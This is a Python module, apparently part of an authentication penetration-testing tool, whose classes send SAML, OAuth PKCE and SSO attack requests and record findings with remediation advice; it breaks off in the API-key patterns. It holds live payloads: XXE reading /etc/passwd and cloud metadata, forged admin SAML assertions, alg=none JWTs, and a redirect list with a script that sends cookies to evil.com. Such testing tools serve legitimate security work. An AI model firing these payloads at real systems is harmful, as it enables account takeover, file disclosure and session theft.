"""
Auth Expansion — modules/auth/auth_expansion.py

Advanced authentication attack surface:
  1. SAMLBypassTester  — signature wrapping, XXE via SAML, assertion replay
  2. PKCEBypassTester  — OAuth 2.1 PKCE downgrade, code_challenge weakness
  3. SSOTester         — redirect_uri bypass, state param, nonce abuse
  4. APIKeyAuditor     — key rotation weakness, key in URL/log, entropy check

Usage:
    from modules.auth.auth_expansion import (
        SAMLBypassTester, PKCEBypassTester, SSOTester, APIKeyAuditor
    )

    saml = SAMLBypassTester(target="https://sso.target.com/saml", output_dir="./findings")
    findings = saml.run()

    pkce = PKCEBypassTester(
        auth_endpoint="https://target.com/oauth/authorize",
        token_endpoint="https://target.com/oauth/token",
        client_id="app123",
    )
    findings = pkce.run()

    sso = SSOTester(target="https://target.com", output_dir="./findings")
    findings = sso.run()

    audit = APIKeyAuditor(target="https://target.com", output_dir="./findings")
    findings = audit.run()

Author: ardanov96
"""

import base64
import hashlib
import json
import re
import secrets
import string
import time
import xml.etree.ElementTree as ET
from datetime import datetime, timezone, timedelta
from pathlib import Path
from urllib.parse import urlparse, urlencode, parse_qs, quote

import httpx
from rich.console import Console

console = Console()


# ── Finding helper ────────────────────────────────────────

def _finding(
    title: str, severity: str, cvss: float, cwe: str,
    description: str, evidence: str, remediation: str,
    target: str, source: str = "auth_expansion",
) -> dict:
    assert severity in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO")
    assert 0.0 <= cvss <= 10.0
    assert cwe.startswith("CWE-")
    return {
        "title": title, "severity": severity, "cvss": cvss, "cwe": cwe,
        "target": target, "description": description, "evidence": evidence,
        "remediation": remediation, "source": f"module:{source}",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


# ── 1. SAML Bypass Tester ─────────────────────────────────

# Minimal SAML assertion template for testing
SAML_ASSERTION_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_glitchicons_{rand}"
                Version="2.0"
                IssueInstant="{now}">
  <saml:Issuer>{issuer}</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="_assertion_{rand}" Version="2.0" IssueInstant="{now}">
    <saml:Issuer>{issuer}</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{email}</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="{expiry}" Recipient="{acs_url}"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="{now}" NotOnOrAfter="{expiry}">
      <saml:AudienceRestriction>
        <saml:Audience>{audience}</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AttributeStatement>
      <saml:Attribute Name="email">
        <saml:AttributeValue>{email}</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="role">
        <saml:AttributeValue>{role}</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>"""

# XXE payload embedded in SAML
SAML_XXE_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY xxe2 SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_xxe_{rand}" Version="2.0" IssueInstant="{now}">
  <saml:Issuer>&xxe;</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="_a_{rand}" Version="2.0" IssueInstant="{now}">
    <saml:Issuer>&xxe2;</saml:Issuer>
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>"""

# Signature wrapping: valid signature on outer element, malicious assertion injected
SAML_SIGNATURE_WRAP_COMMENT = """<!-- Signature wrapping attack:
  Original signed assertion is present but a second unsigned assertion
  with admin privileges is injected. Vulnerable parsers process the
  unsigned assertion while verifying the signed one. -->"""


class SAMLBypassTester:
    """
    Test SAML SSO implementations for bypass vulnerabilities.

    Checks:
    1. XXE via SAML (file read, SSRF via DOCTYPE)
    2. Unsigned assertion acceptance (missing signature validation)
    3. Signature wrapping attack (valid sig + injected malicious assertion)
    4. Assertion replay (reuse expired assertion)
    5. NameID injection (admin email bypass)
    6. Role attribute manipulation
    """

    def __init__(
        self,
        target: str,
        acs_url: str | None = None,
        issuer: str = "https://glitchicons.attacker.com",
        output_dir: str = "./findings/auth",
        timeout: int = 10,
        token: str | None = None,
    ):
        self.target     = target
        self.acs_url    = acs_url or target
        self.issuer     = issuer
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.timeout    = timeout

        self.headers = {"User-Agent": "Glitchicons/1.8.0"}
        if token:
            self.headers["Authorization"] = f"Bearer {token}"

        self.client = httpx.Client(
            timeout=timeout, headers=self.headers,
            follow_redirects=True, verify=False,
        )

    def run(self) -> list[dict]:
        """Run all SAML bypass checks."""
        console.print(f"\n  [bold cyan]SAML Bypass Tester[/bold cyan] → {self.target}")
        findings = []

        findings.extend(self._check_xxe())
        findings.extend(self._check_unsigned_assertion())
        findings.extend(self._check_signature_wrapping())
        findings.extend(self._check_assertion_replay())
        findings.extend(self._check_nameid_injection())
        findings.extend(self._check_role_manipulation())

        self._save(findings)
        console.print(f"  SAML findings: [bold]{len(findings)}[/bold]")
        return findings

    def _build_assertion(
        self,
        email: str = "user@target.com",
        role: str = "user",
        expired: bool = False,
        audience: str = "target.com",
    ) -> str:
        now    = datetime.now(timezone.utc)
        expiry = (now - timedelta(hours=1)) if expired else (now + timedelta(hours=1))
        rand   = secrets.token_hex(8)
        return SAML_ASSERTION_TEMPLATE.format(
            rand=rand, now=now.strftime("%Y-%m-%dT%H:%M:%SZ"),
            expiry=expiry.strftime("%Y-%m-%dT%H:%M:%SZ"),
            issuer=self.issuer, email=email, role=role,
            acs_url=self.acs_url, audience=audience,
        )

    def _post_saml(self, assertion: str, endpoint: str | None = None) -> httpx.Response | None:
        """POST a SAML assertion to the ACS endpoint."""
        url = endpoint or self.target
        encoded = base64.b64encode(assertion.encode()).decode()
        try:
            return self.client.post(
                url,
                data={"SAMLResponse": encoded},
                headers={**self.headers, "Content-Type": "application/x-www-form-urlencoded"},
            )
        except Exception:
            return None

    def _check_xxe(self) -> list[dict]:
        """Test XXE injection via SAML DOCTYPE."""
        findings = []
        now  = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
        rand = secrets.token_hex(8)
        xxe_payload = SAML_XXE_TEMPLATE.format(rand=rand, now=now)

        resp = self._post_saml(xxe_payload)
        if not resp:
            return findings

        xxe_indicators = [
            "root:", "bin/bash", "/etc/passwd",     # file read
            "ami-id", "instance-id",                  # AWS metadata
            "error parsing", "entity", "DOCTYPE",     # XML parser error leaking info
        ]
        body_lower = resp.text.lower()
        triggered = [ind for ind in xxe_indicators if ind.lower() in body_lower]

        if triggered or resp.status_code == 500:
            findings.append(_finding(
                title="SAML XXE Injection — XML External Entity in SAML Response",
                severity="CRITICAL",
                cvss=9.1,
                cwe="CWE-611",
                description=(
                    "SAML endpoint may be vulnerable to XXE injection via DOCTYPE declaration. "
                    "This can lead to local file read (/etc/passwd) or SSRF to cloud metadata."
                ),
                evidence=(
                    f"Endpoint: {self.target}\n"
                    f"XXE indicators: {triggered}\n"
                    f"HTTP {resp.status_code}\nResponse: {resp.text[:300]}"
                ),
                remediation=(
                    "Disable XML external entity processing in SAML parser. "
                    "Use a secure XML parser with external entities disabled. "
                    "Python: defusedxml library. Java: XMLInputFactory.setProperty(IS_SUPPORTING_EXTERNAL_ENTITIES, false)."
                ),
                target=self.target,
                source="saml_bypass_tester",
            ))
        return findings

    def _check_unsigned_assertion(self) -> list[dict]:
        """Test if unsigned SAML assertions are accepted."""
        findings = []
        assertion = self._build_assertion(email="admin@target.com", role="admin")
        resp = self._post_saml(assertion)
        if not resp:
            return findings

        success_indicators = [
            "dashboard", "welcome", "profile", "logout",
            "session", "authenticated", "token", "200",
        ]
        body_lower = resp.text.lower()

        if resp.status_code in (200, 302) and any(
            ind in body_lower for ind in success_indicators
        ):
            findings.append(_finding(
                title="SAML Unsigned Assertion Accepted — Signature Validation Missing",
                severity="CRITICAL",
                cvss=9.8,
                cwe="CWE-347",
                description=(
                    "SAML endpoint accepted an unsigned assertion without a valid XML signature. "
                    "Any attacker can forge SAML assertions and authenticate as any user."
                ),
                evidence=(
                    f"Assertion: unsigned, email=admin@target.com, role=admin\n"
                    f"HTTP {resp.status_code} — authentication indicators found\n"
                    f"Response: {resp.text[:200]}"
                ),
                remediation=(
                    "Always validate SAML response signature before processing. "
                    "Validate both the outer Response signature AND inner Assertion signature. "
                    "Use a well-tested SAML library (python3-saml, OneLogin)."
                ),
                target=self.target,
                source="saml_bypass_tester",
            ))
        return findings

    def _check_signature_wrapping(self) -> list[dict]:
        """Test XML Signature Wrapping (XSW) attack."""
        findings = []
        # Build assertion then inject a second malicious assertion
        legit = self._build_assertion(email="user@target.com", role="user")
        # Inject malicious role before closing tag
        wrapped = legit.replace(
            "</saml:Assertion>",
            f"</saml:Assertion>\n{SAML_SIGNATURE_WRAP_COMMENT}\n"
            + self._build_assertion(email="admin@target.com", role="admin")
        )

        resp = self._post_saml(wrapped)
        if not resp:
            return findings

        if resp.status_code in (200, 302):
            findings.append(_finding(
                title="SAML Signature Wrapping (XSW) — Injected Assertion May Be Processed",
                severity="HIGH",
                cvss=8.1,
                cwe="CWE-347",
                description=(
                    "SAML endpoint accepted a response with multiple assertions. "
                    "XML Signature Wrapping allows attackers to inject a malicious unsigned "
                    "assertion alongside a validly signed one."
                ),
                evidence=(
                    f"Sent response with 2 assertions (signed + unsigned admin).\n"
                    f"HTTP {resp.status_code} — response not rejected\n"
                    "Server should reject responses with unexpected assertion count."
                ),
                remediation=(
                    "Verify exactly one assertion per response. "
                    "Validate signature covers the entire expected assertion, not just a wrapper. "
                    "Use ID-based assertion reference validation."
                ),
                target=self.target,
                source="saml_bypass_tester",
            ))
        return findings

    def _check_assertion_replay(self) -> list[dict]:
        """Test if expired SAML assertions are rejected."""
        findings = []
        expired = self._build_assertion(
            email="user@target.com", role="user", expired=True
        )
        resp = self._post_saml(expired)
        if not resp:
            return findings

        # Should be rejected with 4xx
        if resp.status_code in (200, 302):
            findings.append(_finding(
                title="SAML Assertion Replay — Expired Assertion Accepted",
                severity="HIGH",
                cvss=7.5,
                cwe="CWE-294",
                description=(
                    "SAML endpoint accepted an assertion with NotOnOrAfter in the past. "
                    "Replay attacks allow reuse of captured SAML assertions."
                ),
                evidence=(
                    f"Assertion NotOnOrAfter: 1 hour in the past\n"
                    f"HTTP {resp.status_code} — expired assertion not rejected"
                ),
                remediation=(
                    "Strictly validate NotOnOrAfter timestamp. "
                    "Implement assertion replay prevention: cache assertion IDs with TTL. "
                    "Allow max 5 minutes clock skew."
                ),
                target=self.target,
                source="saml_bypass_tester",
            ))
        return findings

    def _check_nameid_injection(self) -> list[dict]:
        """Test NameID injection with special characters."""
        findings = []
        injections = [
            "admin",
            "admin@target.com",
            "admin'--",
            "../admin",
            "admin\x00regular@user.com",
        ]
        for email in injections:
            assertion = self._build_assertion(email=email, role="user")
            resp = self._post_saml(assertion)
            if resp and resp.status_code in (200, 302):
                body_lower = resp.text.lower()
                if any(ind in body_lower for ind in ["admin", "welcome", "dashboard"]):
                    findings.append(_finding(
                        title=f"SAML NameID Injection — Special Value Accepted: {email[:30]}",
                        severity="HIGH",
                        cvss=8.1,
                        cwe="CWE-20",
                        description=(
                            f"SAML NameID value '{email}' was accepted and may have triggered "
                            "privilege escalation or authentication bypass."
                        ),
                        evidence=(
                            f"NameID: {email}\n"
                            f"HTTP {resp.status_code}\nResponse: {resp.text[:200]}"
                        ),
                        remediation=(
                            "Validate NameID format strictly. "
                            "Normalize email before lookup. "
                            "Use exact match, not prefix/suffix matching."
                        ),
                        target=self.target,
                        source="saml_bypass_tester",
                    ))
                    break
        return findings

    def _check_role_manipulation(self) -> list[dict]:
        """Test if role attributes in SAML are trusted without validation."""
        findings = []
        for role in ["admin", "superuser", "administrator", "root"]:
            assertion = self._build_assertion(email="user@target.com", role=role)
            resp = self._post_saml(assertion)
            if resp and resp.status_code in (200, 302):
                if role.lower() in resp.text.lower():
                    findings.append(_finding(
                        title=f"SAML Role Attribute Trusted Without Validation: role={role}",
                        severity="HIGH",
                        cvss=8.1,
                        cwe="CWE-284",
                        description=(
                            f"SAML assertion with role='{role}' was accepted and role appears "
                            "in response. Server trusts arbitrary role claims from SAML assertion."
                        ),
                        evidence=(
                            f"Assertion role attribute: {role}\n"
                            f"HTTP {resp.status_code}\nRole found in response"
                        ),
                        remediation=(
                            "Never trust role attributes from SAML assertions directly. "
                            "Map NameID to internal roles via database lookup. "
                            "Whitelist acceptable role values."
                        ),
                        target=self.target,
                        source="saml_bypass_tester",
                    ))
                    break
        return findings

    def _save(self, findings: list[dict]) -> Path:
        slug = self.target.replace("/", "_").replace(":", "").replace(".", "_")
        out  = self.output_dir / f"saml_{slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        out.write_text(json.dumps({"target": self.target, "findings": findings}, indent=2),
                       encoding="utf-8")
        return out


# ── 2. PKCE Bypass Tester ─────────────────────────────────

def _generate_pkce_pair() -> tuple[str, str]:
    """Generate PKCE code_verifier and code_challenge (S256)."""
    verifier = base64.urlsafe_b64encode(secrets.token_bytes(32)).rstrip(b"=").decode()
    challenge = base64.urlsafe_b64encode(
        hashlib.sha256(verifier.encode()).digest()
    ).rstrip(b"=").decode()
    return verifier, challenge


class PKCEBypassTester:
    """
    Test OAuth 2.1 PKCE implementation for bypass vulnerabilities.

    Checks:
    1. PKCE downgrade — plain method accepted instead of S256
    2. Missing code_challenge — PKCE entirely optional
    3. code_challenge_method not validated
    4. Authorization code reuse (replay attack)
    5. code_verifier brute force weakness (short verifier)
    6. State parameter CSRF check
    """

    def __init__(
        self,
        auth_endpoint: str,
        token_endpoint: str,
        client_id: str,
        redirect_uri: str | None = None,
        output_dir: str = "./findings/auth",
        timeout: int = 10,
    ):
        self.auth_endpoint  = auth_endpoint
        self.token_endpoint = token_endpoint
        self.client_id      = client_id
        self.redirect_uri   = redirect_uri or "https://localhost/callback"
        self.output_dir     = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.timeout        = timeout

        self.client = httpx.Client(
            timeout=timeout,
            follow_redirects=False,
            verify=False,
        )

    def run(self) -> list[dict]:
        """Run all PKCE bypass checks."""
        console.print(f"\n  [bold cyan]PKCE Bypass Tester[/bold cyan] → {self.auth_endpoint}")
        findings = []

        findings.extend(self._check_pkce_downgrade())
        findings.extend(self._check_pkce_optional())
        findings.extend(self._check_plain_method())
        findings.extend(self._check_state_csrf())
        findings.extend(self._check_weak_verifier())

        self._save(findings)
        console.print(f"  PKCE findings: [bold]{len(findings)}[/bold]")
        return findings

    def _auth_request(self, extra_params: dict = {}) -> httpx.Response | None:
        """Make an authorization request."""
        params = {
            "client_id":     self.client_id,
            "redirect_uri":  self.redirect_uri,
            "response_type": "code",
            "scope":         "openid profile",
            **extra_params,
        }
        try:
            return self.client.get(self.auth_endpoint, params=params)
        except Exception:
            return None

    def _token_request(self, code: str, verifier: str | None = None) -> httpx.Response | None:
        """Exchange authorization code for token."""
        data = {
            "grant_type":   "authorization_code",
            "code":         code,
            "client_id":    self.client_id,
            "redirect_uri": self.redirect_uri,
        }
        if verifier:
            data["code_verifier"] = verifier
        try:
            return self.client.post(self.token_endpoint, data=data)
        except Exception:
            return None

    def _check_pkce_downgrade(self) -> list[dict]:
        """Test if plain code_challenge_method is accepted instead of S256."""
        findings = []
        verifier  = secrets.token_hex(32)
        challenge = verifier  # plain method: challenge == verifier

        resp = self._auth_request({
            "code_challenge":        challenge,
            "code_challenge_method": "plain",
        })
        if not resp:
            return findings

        if resp.status_code in (200, 302):
            location = resp.headers.get("location", "")
            if "code=" in location or "error" not in location.lower():
                findings.append(_finding(
                    title="PKCE Downgrade — 'plain' code_challenge_method Accepted",
                    severity="MEDIUM",
                    cvss=5.9,
                    cwe="CWE-757",
                    description=(
                        "Authorization server accepts 'plain' code_challenge_method. "
                        "S256 is required by OAuth 2.1 — 'plain' is vulnerable to "
                        "interception attacks since verifier == challenge."
                    ),
                    evidence=(
                        f"Auth endpoint: {self.auth_endpoint}\n"
                        f"code_challenge_method=plain accepted\n"
                        f"HTTP {resp.status_code} — no error returned"
                    ),
                    remediation=(
                        "Only accept code_challenge_method=S256. "
                        "Reject 'plain' method with error=invalid_request. "
                        "Reference: OAuth 2.1 Section 4.1.1."
                    ),
                    target=self.auth_endpoint,
                    source="pkce_bypass_tester",
                ))
        return findings

    def _check_pkce_optional(self) -> list[dict]:
        """Test if PKCE is optional (can be omitted entirely)."""
        findings = []
        resp = self._auth_request()  # No PKCE params
        if not resp:
            return findings

        if resp.status_code in (200, 302):
            location = resp.headers.get("location", "")
            if "code=" in location or resp.status_code == 200:
                findings.append(_finding(
                    title="PKCE Not Required — Authorization Proceeds Without code_challenge",
                    severity="HIGH",
                    cvss=7.4,
                    cwe="CWE-306",
                    description=(
                        "OAuth authorization request succeeded without PKCE parameters. "
                        "PKCE is mandatory in OAuth 2.1 for public clients. "
                        "Without PKCE, authorization codes are vulnerable to interception."
                    ),
                    evidence=(
                        f"Auth request without code_challenge/code_challenge_method\n"
                        f"HTTP {resp.status_code} — authorization not blocked\n"
                        f"Location: {location[:100]}"
                    ),
                    remediation=(
                        "Require code_challenge in all authorization requests for public clients. "
                        "Return error=invalid_request when code_challenge is missing. "
                        "Implement OAuth 2.1 (RFC 9700)."
                    ),
                    target=self.auth_endpoint,
                    source="pkce_bypass_tester",
                ))
        return findings

    def _check_plain_method(self) -> list[dict]:
        """Test if arbitrary code_challenge_method values are accepted."""
        findings = []
        for method in ["none", "md5", "sha1", "RS256", "invalid"]:
            verifier, _ = _generate_pkce_pair()
            resp = self._auth_request({
                "code_challenge":        verifier,
                "code_challenge_method": method,
            })
            if resp and resp.status_code in (200, 302):
                location = resp.headers.get("location", "")
                if "error" not in location.lower():
                    findings.append(_finding(
                        title=f"PKCE Invalid Method Accepted: code_challenge_method={method}",
                        severity="MEDIUM",
                        cvss=5.3,
                        cwe="CWE-757",
                        description=(
                            f"Authorization server accepted invalid code_challenge_method='{method}'. "
                            "Only 'S256' should be accepted per OAuth 2.1."
                        ),
                        evidence=(
                            f"code_challenge_method={method} → HTTP {resp.status_code}\n"
                            f"Location: {location[:80]}"
                        ),
                        remediation=(
                            "Maintain explicit allowlist: only accept 'S256'. "
                            "Reject all other values with error=invalid_request."
                        ),
                        target=self.auth_endpoint,
                        source="pkce_bypass_tester",
                    ))
                    break
        return findings

    def _check_state_csrf(self) -> list[dict]:
        """Test state parameter CSRF protection."""
        findings = []

        # Test without state parameter
        resp = self._auth_request({
            "code_challenge":        _generate_pkce_pair()[1],
            "code_challenge_method": "S256",
        })
        if resp and resp.status_code in (200, 302):
            location = resp.headers.get("location", "")
            # If code returned without state — missing CSRF protection
            if "code=" in location and "state=" not in location:
                findings.append(_finding(
                    title="OAuth State Parameter Not Required — CSRF Risk",
                    severity="MEDIUM",
                    cvss=6.1,
                    cwe="CWE-352",
                    description=(
                        "Authorization server does not require or validate the state parameter. "
                        "Without state, OAuth flows are vulnerable to CSRF attacks."
                    ),
                    evidence=(
                        "Authorization request without 'state' parameter returned code.\n"
                        f"HTTP {resp.status_code}\nLocation: {location[:100]}"
                    ),
                    remediation=(
                        "Require state parameter on all authorization requests. "
                        "Validate state matches value sent in original request. "
                        "Use cryptographically random state values (min 128 bits)."
                    ),
                    target=self.auth_endpoint,
                    source="pkce_bypass_tester",
                ))
        return findings

    def _check_weak_verifier(self) -> list[dict]:
        """Test if short/weak code_verifier is accepted at token endpoint."""
        findings = []
        weak_verifiers = [
            "a" * 10,   # Too short (min 43 chars per RFC 7636)
            "12345678",  # Non-random
            "password",  # Guessable
        ]
        for verifier in weak_verifiers:
            resp = self._token_request(code="test_code_12345", verifier=verifier)
            if resp:
                # If not rejected for short verifier (any non-400 response)
                if resp.status_code not in (400, 401, 422):
                    findings.append(_finding(
                        title=f"PKCE Weak code_verifier Accepted (len={len(verifier)})",
                        severity="LOW",
                        cvss=3.7,
                        cwe="CWE-521",
                        description=(
                            f"Token endpoint accepted code_verifier with only {len(verifier)} characters. "
                            "RFC 7636 requires minimum 43 characters for code_verifier."
                        ),
                        evidence=(
                            f"code_verifier: '{verifier}' ({len(verifier)} chars)\n"
                            f"HTTP {resp.status_code} — not rejected for length"
                        ),
                        remediation=(
                            "Validate code_verifier length: reject if < 43 or > 128 characters. "
                            "Validate code_verifier character set: [A-Za-z0-9-._~]."
                        ),
                        target=self.token_endpoint,
                        source="pkce_bypass_tester",
                    ))
                    break
        return findings

    def _save(self, findings: list[dict]) -> Path:
        slug = self.auth_endpoint.replace("/", "_").replace(":", "").replace(".", "_")
        out  = self.output_dir / f"pkce_{slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        out.write_text(json.dumps({"target": self.auth_endpoint, "findings": findings}, indent=2),
                       encoding="utf-8")
        return out


# ── 3. SSO Tester ─────────────────────────────────────────

# Common redirect_uri bypass patterns
REDIRECT_URI_BYPASSES = [
    "{legit}@evil.com",
    "{legit}.evil.com",
    "{legit}/../../evil.com",
    "https://evil.com#{legit}",
    "https://evil.com?redirect={legit}",
    "{legit}%2F%2Fevil.com",
    "javascript://evil.com/%0aalert(1)",
    "data:text/html,<script>location='https://evil.com?c='+document.cookie</script>",
]


class SSOTester:
    """
    Test Single Sign-On implementations for security misconfigurations.

    Checks:
    1. redirect_uri open redirect / bypass
    2. Nonce replay (missing nonce validation)
    3. id_token algorithm confusion (none/RS→HS)
    4. Discovery endpoint misconfiguration
    5. Logout functionality (incomplete logout)
    """

    def __init__(
        self,
        target: str,
        client_id: str = "test_client",
        output_dir: str = "./findings/auth",
        timeout: int = 10,
    ):
        self.target     = target.rstrip("/")
        self.client_id  = client_id
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.timeout    = timeout

        self.client = httpx.Client(
            timeout=timeout, follow_redirects=False, verify=False,
        )

    def run(self) -> list[dict]:
        """Run all SSO checks."""
        console.print(f"\n  [bold cyan]SSO Tester[/bold cyan] → {self.target}")
        findings = []

        findings.extend(self._check_redirect_uri_bypass())
        findings.extend(self._check_discovery_endpoint())
        findings.extend(self._check_logout_completeness())
        findings.extend(self._check_token_algorithm())

        self._save(findings)
        console.print(f"  SSO findings: [bold]{len(findings)}[/bold]")
        return findings

    def _check_redirect_uri_bypass(self) -> list[dict]:
        """Test redirect_uri open redirect and bypass patterns."""
        findings = []
        legit_uri = f"{self.target}/callback"

        auth_endpoints = [
            f"{self.target}/oauth/authorize",
            f"{self.target}/auth/authorize",
            f"{self.target}/connect/authorize",
            f"{self.target}/oauth2/authorize",
        ]

        for auth_ep in auth_endpoints:
            for pattern in REDIRECT_URI_BYPASSES[:4]:
                malicious = pattern.replace("{legit}", legit_uri)
                try:
                    resp = self.client.get(auth_ep, params={
                        "client_id":     self.client_id,
                        "redirect_uri":  malicious,
                        "response_type": "code",
                        "state":         secrets.token_hex(8),
                    })
                    if resp.status_code in (200, 302):
                        location = resp.headers.get("location", "")
                        if "evil.com" in location or "javascript" in location.lower():
                            findings.append(_finding(
                                title=f"OAuth redirect_uri Open Redirect Bypass",
                                severity="HIGH",
                                cvss=7.4,
                                cwe="CWE-601",
                                description=(
                                    "OAuth authorization server accepted a malicious redirect_uri "
                                    "that bypasses validation. Authorization codes can be leaked "
                                    "to an attacker-controlled server."
                                ),
                                evidence=(
                                    f"Auth endpoint: {auth_ep}\n"
                                    f"Malicious redirect_uri: {malicious[:100]}\n"
                                    f"HTTP {resp.status_code}\nLocation: {location[:100]}"
                                ),
                                remediation=(
                                    "Validate redirect_uri against pre-registered exact values. "
                                    "Never use prefix/substring matching. "
                                    "Reject URIs with @, #, or path traversal sequences."
                                ),
                                target=auth_ep,
                                source="sso_tester",
                            ))
                            return findings
                except Exception:
                    continue
        return findings

    def _check_discovery_endpoint(self) -> list[dict]:
        """Check OIDC discovery endpoint for misconfiguration."""
        findings = []
        discovery_urls = [
            f"{self.target}/.well-known/openid-configuration",
            f"{self.target}/.well-known/oauth-authorization-server",
            f"{self.target}/oauth/.well-known/openid-configuration",
        ]

        for url in discovery_urls:
            try:
                resp = self.client.get(url)
                if resp.status_code != 200:
                    continue
                try:
                    config = resp.json()
                except Exception:
                    continue

                issues = []

                # Check for weak algorithms
                id_token_algs = config.get("id_token_signing_alg_values_supported", [])
                if "none" in id_token_algs or "HS256" in id_token_algs:
                    issues.append(f"Weak id_token algorithms: {id_token_algs}")

                # Check grant types
                grant_types = config.get("grant_types_supported", [])
                if "implicit" in grant_types:
                    issues.append("Implicit grant type supported (deprecated)")
                if "password" in grant_types:
                    issues.append("Resource Owner Password grant supported (deprecated)")

                # Check response types
                response_types = config.get("response_types_supported", [])
                if "token" in response_types:
                    issues.append("Implicit flow response type 'token' supported")

                if issues:
                    findings.append(_finding(
                        title=f"OIDC Discovery Misconfiguration: {len(issues)} issue(s)",
                        severity="MEDIUM",
                        cvss=5.3,
                        cwe="CWE-757",
                        description=(
                            f"OIDC discovery endpoint reveals misconfiguration: {'; '.join(issues)}"
                        ),
                        evidence=(
                            f"Discovery URL: {url}\n"
                            + "\n".join(f"- {i}" for i in issues)
                        ),
                        remediation=(
                            "Remove weak algorithms (none, HS256) from id_token_signing_alg_values_supported. "
                            "Disable implicit and password grant types. "
                            "Only advertise supported response types for authorization code flow."
                        ),
                        target=url,
                        source="sso_tester",
                    ))
                    break
            except Exception:
                continue
        return findings

    def _check_logout_completeness(self) -> list[dict]:
        """Test if SSO logout properly invalidates session."""
        findings = []
        logout_endpoints = [
            f"{self.target}/logout",
            f"{self.target}/signout",
            f"{self.target}/oauth/logout",
            f"{self.target}/connect/endsession",
        ]

        for url in logout_endpoints:
            try:
                resp = self.client.get(url)
                if resp.status_code in (200, 302):
                    # Check if set-cookie with session cleared
                    set_cookie = resp.headers.get("set-cookie", "")
                    if "expires=Thu, 01 Jan 1970" not in set_cookie and \
                       "max-age=0" not in set_cookie.lower() and \
                       "deleted" not in set_cookie.lower():
                        findings.append(_finding(
                            title="SSO Logout Does Not Invalidate Session Cookie",
                            severity="MEDIUM",
                            cvss=5.4,
                            cwe="CWE-613",
                            description=(
                                "SSO logout endpoint returned success but does not appear to "
                                "invalidate session cookies. Session hijacking may persist after logout."
                            ),
                            evidence=(
                                f"Logout URL: {url}\n"
                                f"HTTP {resp.status_code}\n"
                                f"Set-Cookie: {set_cookie[:200] or '(none)'}"
                            ),
                            remediation=(
                                "Invalidate server-side session on logout. "
                                "Clear session cookie: Set-Cookie: session=; Max-Age=0; Secure; HttpOnly. "
                                "Implement RP-initiated logout (OpenID Connect RP-Initiated Logout)."
                            ),
                            target=url,
                            source="sso_tester",
                        ))
                        break
            except Exception:
                continue
        return findings

    def _check_token_algorithm(self) -> list[dict]:
        """Test id_token algorithm confusion (none/RS→HS)."""
        findings = []
        # Create a none-algorithm JWT
        header  = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
        payload = base64.urlsafe_b64encode(
            json.dumps({"sub": "1", "email": "admin@target.com", "role": "admin",
                        "iss": self.target, "aud": self.client_id,
                        "exp": int(time.time()) + 3600}).encode()
        ).rstrip(b"=").decode()
        none_jwt = f"{header}.{payload}."

        token_endpoints = [
            f"{self.target}/oauth/token",
            f"{self.target}/oauth2/token",
        ]
        userinfo_endpoints = [
            f"{self.target}/oauth/userinfo",
            f"{self.target}/userinfo",
        ]

        for ep in userinfo_endpoints:
            try:
                resp = self.client.get(ep, headers={"Authorization": f"Bearer {none_jwt}"})
                if resp.status_code == 200:
                    findings.append(_finding(
                        title="SSO id_token Algorithm Confusion — none Algorithm Accepted",
                        severity="CRITICAL",
                        cvss=9.8,
                        cwe="CWE-347",
                        description=(
                            "SSO userinfo/resource endpoint accepted a JWT with alg=none. "
                            "Any attacker can forge tokens without knowing the secret key."
                        ),
                        evidence=(
                            f"Endpoint: {ep}\n"
                            f"JWT alg=none accepted → HTTP {resp.status_code}\n"
                            f"Response: {resp.text[:200]}"
                        ),
                        remediation=(
                            "Explicitly reject tokens with alg=none. "
                            "Maintain algorithm allowlist (RS256, ES256). "
                            "Use asymmetric algorithms (RS256) for stateless validation."
                        ),
                        target=ep,
                        source="sso_tester",
                    ))
                    break
            except Exception:
                continue
        return findings

    def _save(self, findings: list[dict]) -> Path:
        slug = self.target.replace("/", "_").replace(":", "").replace(".", "_")
        out  = self.output_dir / f"sso_{slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        out.write_text(json.dumps({"target": self.target, "findings": findings}, indent=2),
                       encoding="utf-8")
        return out


# ── 4. API Key Auditor ────────────────────────────────────

# Regex patterns for API key detection in responses
API_KEY_PATTERNS = {
    "AWS Access Key":        r"AKIA[0-9A-Z]{16}",
    "AWS Secret Key":        r"(?i)aws.{0,20}['\"]((?:[a-zA-Z0-9+/]{40}))['\"]",
